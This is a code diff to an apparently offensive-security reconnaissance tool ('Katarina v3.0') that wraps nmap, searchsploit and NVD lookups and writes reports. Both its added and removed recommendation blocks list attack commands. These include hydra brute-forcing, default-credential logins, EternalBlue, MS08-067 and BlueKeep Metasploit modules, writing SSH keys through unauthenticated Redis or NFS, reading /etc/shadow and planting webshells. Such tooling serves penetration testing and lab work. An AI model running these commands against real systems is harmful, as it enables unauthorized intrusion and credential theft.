             out = run_cmd(["nmap","-p",port,"--script","telnet-ntlm-info,telnet-encryption",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"Telnet","raw":out[:800]}
+            enum_results[key] = {"service":"Telnet","raw":out[:800],"findings":[]}
             warning(f"  Telnet → CLEARTEXT protocol — credentials transmitted in plain text!")
+
+            enum_results[key]["findings"].append({
+                "fact":"Cleartext protocol — credentials sent in plain text",
+                "severity":"HIGH",
+                "next_steps":[
+                    f"Connect: telnet {target}",
+                    "Try defaults: root:root, admin:admin, admin:password",
+                    f"If on same network: sniff creds with tcpdump -i eth0 -A port 23",
+                ]})
 
         # ── VNC ──────────────────────────────────────────────
         elif service == "vnc" or port == "5900":
             out = run_cmd(["nmap","-p",port,"--script","vnc-info,vnc-brute",
                            "-oN","-",target], verbose, timeout=30)
-            enum_results[key] = {"service":"VNC","raw":out[:800]}
+            enum_results[key] = {"service":"VNC","raw":out[:800],"findings":[]}
             if "Valid credentials" in out: warning(f"  VNC → Valid credentials found!")
             if "None" in out: warning(f"  VNC → No authentication required!")
+
+            if "None" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"No authentication required",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: vncviewer {target}::5900",
+                    ]})
+            elif "Valid credentials" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"Valid credentials confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: vncviewer {target}::5900 with found password",
+                    ]})
 
         # ── Redis ────────────────────────────────────────────
         elif service == "redis" or port == "6379":
             out = run_cmd(["nmap","-p",port,"--script","redis-info","-oN","-",target], verbose)
-            enum_results[key] = {"service":"Redis","raw":out[:800]}
+            enum_results[key] = {"service":"Redis","raw":out[:800],"findings":[]}
             if "connected_clients" in out: warning(f"  Redis → Unauthenticated access!")
+
+            if "connected_clients" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"Unauthenticated access confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: redis-cli -h {target}",
+                        "Dump data: KEYS *",
+                        f"Write SSH key: redis-cli -h {target} CONFIG SET dir /root/.ssh/ then write authorized_keys",
+                        "Write webshell if web root is known",
+                    ]})
 
         else:
             info(f"  No specific module for {friendly} on {key}")
-            enum_results[key] = {"service":friendly,"raw":""}
+            enum_results[key] = {"service":friendly,"raw":"","findings":[]}
 
     return enum_results
 
 # ─────────────────────────────────────────────
 #  VULN SEARCH HELPERS
 # ─────────────────────────────────────────────
+def parse_banner_components(product, version, extra):
+    """Split a service banner into individual (product, version) components.
+
+    Handles two nmap output styles:
+      Structured:  product="Apache httpd"  version="1.3.20"
+                   extra="(Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b"
+      Compound:    product="Apache/1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b"
+                   version=""  extra=""
+
+    Returns: [("Apache httpd", "1.3.20"), ("mod_ssl", "2.8.4"), ("OpenSSL", "0.9.6b")]
+    """
+    _COMP_RE = r"(\S+?)/([\d][\d.]*\w*)"
+    components = []
+
+    if product:
+        cleaned_prod = re.sub(r"\([^)]*\)", " ", product)
+        prod_parts = re.findall(_COMP_RE, cleaned_prod)
+        if prod_parts:
+            seen = set()
+            for name, ver in prod_parts:
+                key = name.lower()
+                if key not in seen:
+                    seen.add(key)
+                    components.append((name, ver))
+        else:
+            components.append((product.strip(), (version or "").strip()))
+
+    if extra:
+        cleaned_extra = re.sub(r"\([^)]*\)", " ", extra)
+        existing = {c[0].lower() for c in components}
+        for m in re.finditer(_COMP_RE, cleaned_extra):
+            name, ver = m.group(1), m.group(2)
+            if name.lower() not in existing:
+                existing.add(name.lower())
+                components.append((name, ver))
+
+    return components if components else [(product or "", version or "")]
+
+def filter_exploits_by_relevance(results, query_product):
+    """Drop exploit results where the product name doesn't appear in the title."""
+    if not query_product:
+        return results
+    words = [w.lower() for w in query_product.split() if len(w) > 2]
+    if not words:
+        return results
+    filtered = []
+    for line in results:
+        title = line.split("|")[0].lower() if "|" in line else line.lower()
+        if any(w in title for w in words):
+            filtered.append(line)
+    return filtered
+
 def find_searchsploit():
     for p in ["/usr/bin/searchsploit","/usr/local/bin/searchsploit",
               "/opt/exploitdb/searchsploit"]:
@@ -731,21 +1201,19 @@ def phase_vuln_search(services, verbose):
     ss_path      = find_searchsploit()
     vuln_results = []
 
-    # Services to skip for vuln search (too generic → too many false positives)
     SKIP_GENERIC = {"status","rpc","portmapper","rpcbind"}
 
     for svc in services:
         product = svc.get("product","").strip()
         version = svc.get("version","").strip()
+        extra   = svc.get("extra","").strip()
         service = svc.get("raw_service","").strip().lower()
         port    = svc.get("port","")
         proto   = svc.get("proto","")
         target  = svc.get("target","")
 
-        # Use product name if available, else service, skip pure generic names
-        query = product if product else service
-        if not query or query.lower() in SKIP_GENERIC:
-            # Still run nmap vuln scripts even for generic services
+        base_query = product if product else service
+        if not base_query or base_query.lower() in SKIP_GENERIC:
             if target:
                 cves_nmap, vulns_nmap, nmap_raw = search_nmap_vulns(target, port, verbose)
                 vuln_results.append({"port":port,"proto":proto,"service":service,
@@ -757,40 +1225,50 @@ def phase_vuln_search(services, verbose):
         entry = {"port":port,"proto":proto,"service":service,"product":product,
                  "version":version,"exploits":[],"cves":[],"nmap_vulns":[],"nmap_raw":""}
 
-        info(f"[{port}/{proto}] Searching: {query} {version}")
+        components = parse_banner_components(product, version, extra)
+        seen_exploits = set()
 
-        # 1. searchsploit
-        ss_results = run_searchsploit(ss_path, query, version, verbose)
-        if not ss_results and product:
-            ss_results = run_searchsploit(ss_path, service, version, verbose)
+        for comp_product, comp_version in components:
+            if not comp_product:
+                continue
+            info(f"[{port}/{proto}] Searching: {comp_product} {comp_version}")
 
-        # 2. ExploitDB CSV fallback
-        if not ss_results:
-            ss_results = search_exploitdb_csv(query, version)
-            if not ss_results and product:
-                ss_results = search_exploitdb_csv(service, version)
+            # 1. searchsploit
+            ss_results = run_searchsploit(ss_path, comp_product, comp_version, verbose)
+            if not ss_results:
+                ss_results = search_exploitdb_csv(comp_product, comp_version)
 
-        if ss_results:
-            entry["exploits"] = ss_results
-            warning(f"  Exploits → {len(ss_results)} found")
-            for ex in ss_results[:5]:
-                parts = [p.strip() for p in ex.split("|")]
-                print(f"    {C.RED}→{C.RESET} {parts[0]}")
-                if len(parts) > 1: print(f"      {C.DIM}{parts[-1]}{C.RESET}")
-        else:
-            info(f"  No exploit DB results for: {query} {version}")
+            ss_results = filter_exploits_by_relevance(ss_results, comp_product)
 
-        # 3. NVD CVE lookup
-        info(f"  NVD lookup: {query} {version}")
-        cve_results = search_cve_online(query, version)
-        if cve_results:
-            entry["cves"] = cve_results
-            warning(f"  NVD → {len(cve_results)} CVE(s)")
-            for c in cve_results[:3]: print(f"    {C.RED}CVE:{C.RESET} {c}")
-        else:
-            info(f"  NVD → No results (offline or no match)")
+            for ex in ss_results:
+                path_part = ex.split("|")[-1].strip().lower() if "|" in ex else ex.strip().lower()
+                if path_part not in seen_exploits:
+                    seen_exploits.add(path_part)
+                    entry["exploits"].append(ex)
 
-        # 4. nmap vuln scripts
+            if ss_results:
+                warning(f"  [{comp_product}] Exploits → {len(ss_results)} found")
+                for ex in ss_results[:5]:
+                    parts = [p.strip() for p in ex.split("|")]
+                    print(f"    {C.RED}→{C.RESET} {parts[0]}")
+                    if len(parts) > 1: print(f"      {C.DIM}{parts[-1]}{C.RESET}")
+            else:
+                info(f"  [{comp_product}] No exploit DB results")
+
+            # 2. NVD CVE lookup
+            info(f"  [{comp_product}] NVD lookup")
+            cve_results = search_cve_online(comp_product, comp_version)
+            if cve_results:
+                existing_ids = {c.split()[0] for c in entry["cves"]}
+                for c in cve_results:
+                    if c.split()[0] not in existing_ids:
+                        entry["cves"].append(c)
+                warning(f"  [{comp_product}] NVD → {len(cve_results)} CVE(s)")
+                for c in cve_results[:3]: print(f"    {C.RED}CVE:{C.RESET} {c}")
+            else:
+                info(f"  [{comp_product}] NVD → No results")
+
+        # 3. nmap vuln scripts (once per port, not per component)
         if target:
             cves_nmap, vulns_nmap, nmap_raw = search_nmap_vulns(target, port, verbose)
             entry["nmap_vulns"] = vulns_nmap
@@ -804,6 +1282,7 @@ def phase_vuln_search(services, verbose):
                 warning(f"  nmap vuln → {len(vulns_nmap)} finding(s)")
                 for v in vulns_nmap[:3]: print(f"    {C.RED}!{C.RESET} {v}")
 
+        entry["exploits"] = entry["exploits"][:20]
         vuln_results.append(entry)
 
     return vuln_results
@@ -814,122 +1293,57 @@ def phase_vuln_search(services, verbose):
 def phase_recommendations(services, vuln_results, fw_analysis, enum_results):
     section("PHASE 6 — Recommendations & Next Steps")
     recs = []
+    seen_facts = set()
 
-    if fw_analysis.get("firewall_detected"):
-        recs.append({"priority":"INFO","title":"Firewall Detected",
-            "detail":"Try fragmented packets: nmap -f\n"
-                     "Try decoys: nmap -D RND:10\n"
-                     "Try source port: nmap --source-port 53"})
+    if fw_analysis.get("skipped"):
+        recs.append({"priority":"INFO","title":"Firewall Analysis Skipped",
+            "detail":"ACK/Window scans require root/sudo\n"
+                     "Re-run with sudo for firewall detection"})
+    elif fw_analysis.get("firewall_detected"):
+        detail = ("Try fragmented packets: nmap -f\n"
+                  "Try decoys: nmap -D RND:10\n"
+                  "Try source port: nmap --source-port 53")
+        win_open = fw_analysis.get("window_open", [])
+        if win_open:
+            detail += f"\nWindow scan revealed open ports behind firewall: {', '.join(win_open[:10])}"
+        recs.append({"priority":"INFO","title":"Firewall Detected","detail":detail})
 
+    # Generic findings-driven recommendations from Phase 4
     for svc in services:
-        p    = svc["port"]
-        s    = svc["raw_service"].lower()
-        v    = svc.get("version","")
+        port = svc["port"]
+        proto = svc["proto"]
         prod = svc.get("product","")
-        ip   = svc.get("target","")
-        key  = f"{p}/tcp"
+        v    = svc.get("version","")
+        key  = f"{port}/{proto}"
+        enum = enum_results.get(key, {})
+        svc_name = enum.get("service", svc.get("service", "Unknown"))
+        findings = enum.get("findings", [])
 
-        if s == "ftp" or p == "21":
-            anon = enum_results.get(key,{}).get("anonymous","UNKNOWN")
-            recs.append({"priority":"CRITICAL" if anon=="ALLOWED" else "HIGH",
-                "title":f"FTP on port {p} — {prod} {v}  [Anonymous: {anon}]",
-                "detail":f"[1] Anonymous login: ftp {ip}  (already tested: {anon})\n"
-                         f"[2] Brute-force: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://{ip}\n"
-                         f"[3] Check writeable dirs: try uploading a webshell\n"
-                         f"[4] Exploit version: searchsploit {prod} {v}"})
+        for finding in findings:
+            fact = finding["fact"]
+            if fact in seen_facts:
+                continue
+            seen_facts.add(fact)
 
-        elif s == "ssh" or p == "22":
-            recs.append({"priority":"MEDIUM","title":f"SSH on port {p} — {prod} {v}",
-                "detail":f"[1] Brute-force: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t4 ssh://{ip}\n"
-                         f"[2] Try common creds: root:root, admin:admin, msfadmin:msfadmin, user:user\n"
-                         f"[3] Check weak ciphers: ssh-audit {ip}\n"
-                         f"[4] Exploit version: searchsploit {prod} {v}"})
+            detail_lines = []
+            for i, step in enumerate(finding["next_steps"], 1):
+                detail_lines.append(f"[{i}] {step}")
 
-        elif s in ("http","https","http-alt","ssl/http") or p in ("80","443","8080","8443"):
-            scheme = "https" if p in ("443","8443") else "http"
-            recs.append({"priority":"HIGH","title":f"Web service on port {p} — {prod} {v}",
-                "detail":f"[1] Dir brute-force: gobuster dir -u {scheme}://{ip}:{p} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\n"
-                         f"[2] Vuln scan: nikto -h {scheme}://{ip}:{p}\n"
-                         f"[3] Manual: check robots.txt, source code, login forms, file uploads\n"
-                         f"[4] Test SQLi/XSS/LFI on all input fields\n"
-                         f"[5] Exploit version: searchsploit {prod} {v}"})
+            recs.append({
+                "priority": finding["severity"],
+                "title": f"{svc_name} on port {port} — {fact}",
+                "detail": "\n".join(detail_lines),
+            })
 
-        elif s in ("netbios-ssn","microsoft-ds","smb") or p in ("139","445"):
-            null = enum_results.get(key,{}).get("null_session","unknown")
-            recs.append({"priority":"CRITICAL","title":f"SMB on port {p} — {prod} {v}",
-                "detail":f"[1] EternalBlue: nmap -p{p} --script smb-vuln-ms17-010 {ip}\n"
-                         f"[2] MS08-067: msfconsole → use exploit/windows/smb/ms08_067_netapi\n"
-                         f"[3] Null session: smbclient -L //{ip} -N  ({null})\n"
-                         f"[4] Full enum: enum4linux -a {ip}\n"
-                         f"[5] Share perms: smbmap -H {ip}\n"
-                         f"[6] Brute-force: hydra -L users.txt -P passwords.txt smb://{ip}"})
+        if not findings:
+            version_info = f"{prod} {v}".strip()
+            recs.append({
+                "priority": "LOW",
+                "title": f"{svc_name} on port {port} — no specific findings",
+                "detail": f"[1] Check version: searchsploit {version_info}" if version_info else "[1] No version info available — manual investigation needed",
+            })
 
-        elif s == "smtp" or p in ("25","465","587"):
-            recs.append({"priority":"MEDIUM","title":f"SMTP on port {p} — {prod} {v}",
-                "detail":f"[1] User enum: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {ip}\n"
-                         f"[2] Manual VRFY: nc -nv {ip} 25 → VRFY root\n"
-                         f"[3] Open relay: nmap -p{p} --script smtp-open-relay {ip}\n"
-                         f"[4] Exploit version: searchsploit {prod} {v}"})
-
-        elif s == "domain" or p == "53":
-            recs.append({"priority":"HIGH","title":f"DNS on port {p} — {prod} {v}",
-                "detail":f"[1] Zone transfer: dig axfr @{ip} <domain>\n"
-                         f"[2] Zone transfer: dnsrecon -d <domain> -t axfr -n {ip}\n"
-                         f"[3] Subdomain brute: dnsrecon -d <domain> -t brt\n"
-                         f"[4] Version: dig @{ip} version.bind chaos txt\n"
-                         f"[5] Exploit version: searchsploit {prod} {v}"})
-
-        elif s == "mysql" or p == "3306":
-            recs.append({"priority":"HIGH","title":f"MySQL on port {p} — {prod} {v}",
-                "detail":f"[1] Empty root: mysql -h {ip} -u root --password=''\n"
-                         f"[2] Brute-force: hydra -L users.txt -P passwords.txt mysql://{ip}\n"
-                         f"[3] UDF privesc: msfconsole → use exploit/multi/mysql/mysql_udf_payload\n"
-                         f"[4] Exploit version: searchsploit {prod} {v}"})
-
-        elif s in ("ms-wbt-server","rdp") or p == "3389":
-            recs.append({"priority":"HIGH","title":f"RDP on port {p}",
-                "detail":f"[1] BlueKeep: msfconsole → use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n"
-                         f"[2] Check NLA: nmap -p{p} --script rdp-enum-encryption {ip}\n"
-                         f"[3] Brute-force: hydra -L users.txt -P passwords.txt rdp://{ip}"})
-
-        elif s in ("rpcbind","portmapper") or p == "111":
-            recs.append({"priority":"MEDIUM","title":f"RPC/Portmapper on port {p}",
-                "detail":f"[1] List services: rpcinfo -p {ip}\n"
-                         f"[2] Check NFS: showmount -e {ip}\n"
-                         f"[3] If NFS world-readable: mount -t nfs {ip}:/ /mnt/target\n"
-                         f"[4] Check SSH keys: cat /mnt/target/root/.ssh/id_rsa"})
-
-        elif s == "nfs" or p == "2049":
-            exports = enum_results.get(f"{p}/tcp",{}).get("exports",[])
-            world   = [e for e in exports if e[1]=="*"]
-            recs.append({"priority":"CRITICAL" if world else "HIGH",
-                "title":f"NFS on port {p} — {'WORLD READABLE!' if world else 'restricted'}",
-                "detail":f"[1] List exports: showmount -e {ip}\n"
-                         f"[2] Mount: mkdir /mnt/nfs && mount -t nfs {ip}:/ /mnt/nfs\n"
-                         f"[3] Read sensitive files: cat /mnt/nfs/etc/shadow\n"
-                         f"[4] SSH key injection: cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys\n"
-                         f"[5] UID bypass: useradd -u <target_uid> attacker && su attacker"})
-
-        elif s == "snmp" or p == "161":
-            recs.append({"priority":"HIGH","title":f"SNMP on port {p}",
-                "detail":f"[1] Community brute: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {ip}\n"
-                         f"[2] Walk: snmpwalk -c public -v1 {ip}\n"
-                         f"[3] Can leak: users, processes, network interfaces, routing tables"})
-
-        elif s == "telnet" or p == "23":
-            recs.append({"priority":"HIGH","title":f"Telnet on port {p} — CLEARTEXT",
-                "detail":f"[1] Connect: telnet {ip}\n"
-                         f"[2] Try defaults: root/root, admin/admin, guest/guest\n"
-                         f"[3] Brute-force: hydra -L users.txt -P passwords.txt telnet://{ip}\n"
-                         f"[4] Sniff creds: tcpdump -i eth0 -A port 23"})
-
-        elif s == "vnc" or p == "5900":
-            recs.append({"priority":"HIGH","title":f"VNC on port {p}",
-                "detail":f"[1] Connect: vncviewer {ip}:{p}\n"
-                         f"[2] No auth check: nmap -p{p} --script vnc-info {ip}\n"
-                         f"[3] Brute: hydra -P passwords.txt vnc://{ip}"})
-
-    # Vuln-based recs
+    # Vuln-based recs from Phase 5 (already finding-driven)
     for v in vuln_results:
         total = len(v["exploits"]) + len(v["cves"]) + len(v["nmap_vulns"])
         if total > 0:
@@ -968,10 +1382,10 @@ def phase_recommendations(services, vuln_results, fw_analysis, enum_results):
     return recs
 
 # ─────────────────────────────────────────────
-#  PHASE 8 — SCAN METADATA (no attacker info)
+#  PHASE 7 — SCAN METADATA (no attacker info)
 # ─────────────────────────────────────────────
 def phase_metadata(target, args, start_time, port_results, services):
-    section("PHASE 8 — Scan Metadata")
+    section("PHASE 7 — Scan Metadata")
     end_time = time.time()
     duration = end_time - start_time
     meta = {
@@ -1018,8 +1432,14 @@ def generate_txt_report(data, filepath):
 
     lines += ["","[PHASE 2] FIREWALL",sep2]
     fw = data["firewall"]
-    lines.append(f"  Firewall    : {'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}")
+    if fw.get("skipped"):
+        lines.append("  Firewall    : SKIPPED (requires root/sudo)")
+    else:
+        lines.append(f"  Firewall    : {'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}")
     if fw["filtered_ports"]: lines.append(f"  Filtered    : {', '.join(fw['filtered_ports'][:15])}")
+    if fw.get("unfiltered_ports"): lines.append(f"  Unfiltered  : {len(fw['unfiltered_ports'])} port(s)")
+    if fw.get("window_open"): lines.append(f"  Open (Window): {', '.join(fw['window_open'][:15])}")
+    for note in fw.get("notes",[]): lines.append(f"  Note        : {note}")
 
     lines += ["","[PHASE 3] SERVICES",sep2]
     for s in data["services"]:
@@ -1065,7 +1485,7 @@ def generate_txt_report(data, filepath):
         lines += [f"\n  [{r['priority']}] {r['title']}"]
         for line in r["detail"].split("\n"): lines.append(f"  {line}")
 
-    lines += ["","[PHASE 8] SCAN METADATA",sep2]
+    lines += ["","[PHASE 7] SCAN METADATA",sep2]
     for k,v in data["meta"].items(): lines.append(f"  {k:<16}: {v}")
     lines += ["",sep,"  End of Report — Katarina v3.0 by MTM",sep]
 
@@ -1129,7 +1549,21 @@ def generate_html_report(data, filepath):
 
     hd  = data["host_discovery"]
     fw  = data["firewall"]
-    fwc = "#e74c3c" if fw["firewall_detected"] else "#2ecc71"
+    if fw.get("skipped"):
+        fwc = "#f39c12"
+        fw_html = '<p class="fw" style="color:#f39c12">SKIPPED (requires root/sudo)</p>'
+    else:
+        fwc = "#e74c3c" if fw["firewall_detected"] else "#2ecc71"
+        fw_label = 'FIREWALL DETECTED' if fw['firewall_detected'] else 'NO FIREWALL DETECTED'
+        fw_html = f'<p class="fw">{fw_label}</p>'
+        if fw["filtered_ports"]:
+            fw_html += f"<p>Filtered: {', '.join(fw['filtered_ports'][:15])}</p>"
+        if fw.get("unfiltered_ports"):
+            fw_html += f"<p>Unfiltered: {len(fw['unfiltered_ports'])} port(s)</p>"
+        if fw.get("window_open"):
+            fw_html += f"<p>Open behind firewall (Window scan): {', '.join(fw['window_open'][:15])}</p>"
+        for note in fw.get("notes",[]):
+            fw_html += f"<p style='color:#aaa'>{note}</p>"
     meta_rows = "".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k,v in data["meta"].items())
 
     html = f"""<!DOCTYPE html><html lang="en"><head>
@@ -1179,8 +1613,7 @@ pre{{background:#111;padding:8px;border-radius:4px;overflow-x:auto}}
 <h2>Phase 1 — Open Ports</h2>
 <table><tr><th>Port</th><th>Service</th></tr>{tcp_rows}{udp_rows}</table>
 <h2>Phase 2 — Firewall</h2>
-<p class="fw">{'FIREWALL DETECTED' if fw['firewall_detected'] else 'NO FIREWALL DETECTED'}</p>
-{"<p>Filtered: "+', '.join(fw['filtered_ports'][:15])+"</p>" if fw['filtered_ports'] else ""}
+{fw_html}
 <h2>Phase 3 — Services & Versions</h2>
 <table><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr>{svc_rows}</table>
 <h2>Phase 4 — Enumeration Findings</h2>
@@ -1189,7 +1622,7 @@ pre{{background:#111;padding:8px;border-radius:4px;overflow-x:auto}}
 {vuln_sec if vuln_sec else "<p>No vulnerabilities found.</p>"}
 <h2>Phase 6 — Recommendations & Next Steps</h2>
 {rec_sec}
-<h2>Phase 8 — Scan Metadata</h2>
+<h2>Phase 7 — Scan Metadata</h2>
 <table><tr><th>Key</th><th>Value</th></tr>{meta_rows}</table>
 <div class="footer">Katarina v3.0 &mdash; by MTM &mdash; {data['timestamp']}</div>
 </body></html>"""
@@ -1266,10 +1699,22 @@ def generate_pdf_report(data, filepath):
         story.append(tbl(p1,[1*inch,1*inch,4.5*inch]) if len(p1)>1 else Paragraph("No open ports.",body_s))
 
         fw = data["firewall"]
-        fwc2 = RED if fw["firewall_detected"] else GRN
         story.append(Paragraph("Phase 2 — Firewall",h2_s))
-        story.append(Paragraph(f"{'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}",
-            ParagraphStyle("FW",parent=body_s,textColor=fwc2,fontName="Courier-Bold")))
+        if fw.get("skipped"):
+            story.append(Paragraph("SKIPPED (requires root/sudo)",
+                ParagraphStyle("FW",parent=body_s,textColor=colors.HexColor("#f39c12"),fontName="Courier-Bold")))
+        else:
+            fwc2 = RED if fw["firewall_detected"] else GRN
+            story.append(Paragraph(f"{'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}",
+                ParagraphStyle("FW",parent=body_s,textColor=fwc2,fontName="Courier-Bold")))
+            if fw["filtered_ports"]:
+                story.append(Paragraph(f"Filtered: {', '.join(fw['filtered_ports'][:15])}", body_s))
+            if fw.get("unfiltered_ports"):
+                story.append(Paragraph(f"Unfiltered: {len(fw['unfiltered_ports'])} port(s)", body_s))
+            if fw.get("window_open"):
+                story.append(Paragraph(f"Open behind firewall: {', '.join(fw['window_open'][:15])}", body_s))
+        for note in fw.get("notes",[]):
+            story.append(Paragraph(note, body_s))
 
         story.append(Paragraph("Phase 3 — Services",h2_s))
         p3 = [["Port","Proto","Service","Product","Version"]]
@@ -1329,7 +1774,7 @@ def generate_pdf_report(data, filepath):
             for line in r["detail"].split("\n"): story.append(Paragraph(line,body_s))
             story.append(Spacer(1,7))
 
-        story.append(Paragraph("Phase 8 — Metadata",h2_s))
+        story.append(Paragraph("Phase 7 — Metadata",h2_s))
         p8 = [["Key","Value"]]+[[k,str(v)] for k,v in data["meta"].items()]
         story.append(tbl(p8,[2*inch,4.5*inch]))
         story += [Spacer(1,20),HRFlowable(width="100%",thickness=1,color=GRAY)]
@@ -1348,7 +1793,7 @@ def generate_pdf_report(data, filepath):
 
 def phase_report(data, output_file):
     if not output_file: return
-    section("PHASE 7 — Report Generation")
+    section("PHASE 8 — Report Generation")
     ext = Path(output_file).suffix.lower()
     if   ext == ".pdf":  generate_pdf_report(data, output_file)
     elif ext == ".html": generate_html_report(data, output_file)
